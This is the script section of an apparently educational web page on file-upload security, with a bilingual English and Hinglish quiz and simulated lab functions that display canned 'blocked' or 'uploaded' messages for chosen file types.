            "Storing files outside web root"
          ]
        },
        correct: 1,
        explanation: {
          en: "Relying solely on client-side validation is not sufficient as attackers can bypass it. Server-side validation is essential.",
          hi: "Keval client-side validation par bharosa karna par्याप्त nahi hai kyunki hamlawar ise bypass kar sakte hain. Server-side validation aavashyak hai."
        }
      }
    ];

    // Render Quiz
    function renderQuiz() {
      const quizContainer = document.getElementById('quiz-questions');
      quizContainer.innerHTML = '';
      quizQuestions.forEach((q, index) => {
        const questionDiv = document.createElement('div');
        questionDiv.className = 'quiz-question';
        const qText = isHinglish ? q.question.hi : q.question.en;
        const opts = isHinglish ? q.options.hi : q.options.en;
        questionDiv.innerHTML = `
          <h4>Q${index + 1}: ${qText}</h4>
          <div class="options" id="options-${index}">
            ${opts.map((opt, i) => `
              <div class="option" onclick="selectOption(${index}, ${i})">${opt}</div>
            `).join('')}
          </div>
        `;
        quizContainer.appendChild(questionDiv);
      });
    }

    // Track selected answers
    const selectedAnswers = new Array(quizQuestions.length).fill(-1);

    // Select Option
    window.selectOption = function(questionIndex, optionIndex) {
      document.querySelectorAll(`#options-${questionIndex} .option`).forEach(opt => {
        opt.classList.remove('selected');
      });
      document.querySelectorAll(`#options-${questionIndex} .option`)[optionIndex].classList.add('selected');
      selectedAnswers[questionIndex] = optionIndex;
    };

    // Submit Quiz
    window.submitQuiz = function() {
      let score = 0;
      const feedback = document.getElementById('feedback');
      feedback.innerHTML = '';
      feedback.style.display = 'block';

      quizQuestions.forEach((q, index) => {
        const options = document.querySelectorAll(`#options-${index} .option`);
        const explanation = isHinglish ? q.explanation.hi : q.explanation.en;

        if (selectedAnswers[index] === q.correct) {
          score++;
          options[q.correct].classList.add('correct');
          if (selectedAnswers[index] !== -1) options[selectedAnswers[index]].classList.add('correct');
        } else {
          options[q.correct].classList.add('correct');
          if (selectedAnswers[index] !== -1 && selectedAnswers[index] !== q.correct) {
            options[selectedAnswers[index]].classList.add('incorrect');
          }
        }

        feedback.innerHTML += `<strong>Q${index + 1}:</strong> ${explanation}<br><br>`;
      });

      document.getElementById('score-display').textContent = `Score: ${score} / ${quizQuestions.length}`;
      showNotification(isHinglish ? `Quiz pura! Score: ${score}/${quizQuestions.length}` : `Quiz complete! You scored ${score}/${quizQuestions.length}`);
    };

    // Notification
    function showNotification(message) {
      const notification = document.getElementById('notification');
      const notificationText = document.getElementById('notification-text');
      notificationText.textContent = message;
      notification.classList.add('show');
      setTimeout(() => notification.classList.remove('show'), 3000);
    }

    // Scroll Progress Bar
    window.addEventListener('scroll', () => {
      const winHeight = window.innerHeight;
      const docHeight = document.documentElement.scrollHeight;
      const scrollTop = window.pageYOffset;
      const trackLength = docHeight - winHeight;
      const progress = scrollTop / trackLength * 100;
      const progressBar = document.getElementById('progress-bar');
      if (progressBar) {
        progressBar.style.width = progress + '%';
      }
    });

    // Animation on Scroll
    document.addEventListener('DOMContentLoaded', () => {
      const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) entry.target.classList.add('visible');
        });
      }, { threshold: 0.1 });
      document.querySelectorAll('.animate-on-scroll').forEach(el => observer.observe(el));
      renderQuiz();
    });

    // Lab functions
    function testUploadProtection() {
      const fileType = document.getElementById('test-file-type').value;
      const result = document.getElementById('protection-result');
      
      let message = '';
      
      if (fileType === 'php' || fileType === 'js') {
        message = isHinglish 
          ? `❌ ${fileType.toUpperCase()} file block ho gayi!\n\nFile upload prevention mechanisms ne dushit file ko detect kiya aur upload rok diya.` 
          : `❌ ${fileType.toUpperCase()} file blocked!\n\nFile upload prevention mechanisms detected malicious file and prevented upload.`;
      } else {
        message = isHinglish 
          ? `✅ ${fileType.toUpperCase()} file safalata purvak upload ho gayi!\n\nFile validation passed aur file secure location par store ho gayi.` 
          : `✅ ${fileType.toUpperCase()} file successfully uploaded!\n\nFile validation passed and file stored in secure location.`;
      }
      
      result.innerHTML = message;
    }

    function testLabFile() {
      const fileType = document.getElementById('lab-file-type').value;
      const result = document.getElementById('lab-result');
      
      let message = '';
      
      if (fileType.includes('php')) {
        if (fileType === 'php.jpg' || fileType === 'php.png') {
          message = isHinglish 
            ? `⚠️  Double extension file detect hui!\n\nFile: ${fileType}\n\nAdvanced validation mechanisms ne double extension detect kiya aur upload rok diya.` 
            : `⚠️  Double extension file detected!\n\nFile: ${fileType}\n\nAdvanced validation mechanisms detected double extension and prevented upload.`;
        } else {
          message = isHinglish 
            ? `❌ PHP file block ho gayi!\n\nFile upload prevention mechanisms ne PHP file ko detect kiya aur upload rok diya.` 
            : `❌ PHP file blocked!\n\nFile upload prevention mechanisms detected PHP file and prevented upload.`;
        }
      } else if (fileType === 'js') {
        message = isHinglish 
          ? `❌ JavaScript file block ho gayi!\n\nFile upload prevention mechanisms ne JavaScript file ko detect kiya aur upload rok diya.` 
          : `❌ JavaScript file blocked!\n\nFile upload prevention mechanisms detected JavaScript file and prevented upload.`;
      } else {
        message = isHinglish 
          ? `✅ ${fileType.toUpperCase()} file safalata purvak upload ho gayi!\n\nFile validation passed aur file secure location par store ho gayi.` 
          : `✅ ${fileType.toUpperCase()} file successfully uploaded!\n\nFile validation passed and file stored in secure location.`;
      }
      
      result.innerHTML = message;
    }

    function clearLabResults() {
      document.getElementById('lab-result').textContent = '// Lab results will appear here';
    }
  </script>
</body>
</html>
